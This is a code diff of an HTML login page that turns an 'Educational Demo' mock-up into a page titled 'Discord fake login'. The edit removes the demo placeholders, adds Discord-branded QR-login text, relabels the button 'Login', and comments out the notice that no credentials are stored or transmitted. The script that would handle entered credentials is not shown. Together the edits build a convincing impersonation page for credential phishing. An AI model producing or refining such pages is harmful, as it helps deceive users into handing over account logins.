@@ -1,11 +1,11 @@
-
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <title>Space Login — Educational Demo</title>
+  <title>Discord fake login</title>
 
   <!-- Connect the CSS file -->
   <link rel="stylesheet" href="style.css">
@@ -13,6 +13,7 @@
   <!-- Connect the JavaScript file -->
   <script src="script.js" defer></script>
 </head>
+
 <body>
 
   <div class="logo">
@@ -25,26 +26,16 @@
 
       <form id="demo-form">
         <label for="username">Email or username</label>
-        <input
-          id="username"
-          type="text"
-          placeholder="Demo username"
-          autocomplete="off"
-        >
+        <input id="username" type="text" autocomplete="off">
 
         <label for="password">Password</label>
-        <input
-          id="password"
-          type="password"
-          placeholder="Demo password"
-          autocomplete="off"
-        >
+        <input id="password" type="password" autocomplete="off">
 
         <a href="#demo-info" class="forgot">
           Forgot your password?
         </a>
 
-        <button type="submit">Preview login</button>
+        <button type="submit">Login</button>
 
         <p class="register">
           Need an account? <a href="#demo-info">Register</a>
@@ -53,21 +44,20 @@
     </section>
 
     <aside class="qr-section">
-      <div class="qr-placeholder" aria-label="QR code placeholder">
-        QR
-      </div>
-
-      <h2>QR Code Demo</h2>
+      <div id="qrcode"></div>
+      <h2>Log in with QR Code</h2>
       <p>
-        This area represents a QR login panel.
-        It does not authenticate an account.
+        Scan this with the <b>Discord mobile
+          app to log in instantly.</b><br>
+        Or sign in with a passkey
       </p>
     </aside>
 
-    <p id="demo-info" class="demo-notice" role="status">
-      Educational demo. No credentials are stored or transmitted.
-    </p>
-  </main>
 
+  </main>
+  <!-- <footer><p id="demo-info" class="demo-notice" role="status">
+      Educational demo. No credentials are stored or transmitted.
+    </p></footer> -->
 </body>
+
 </html>
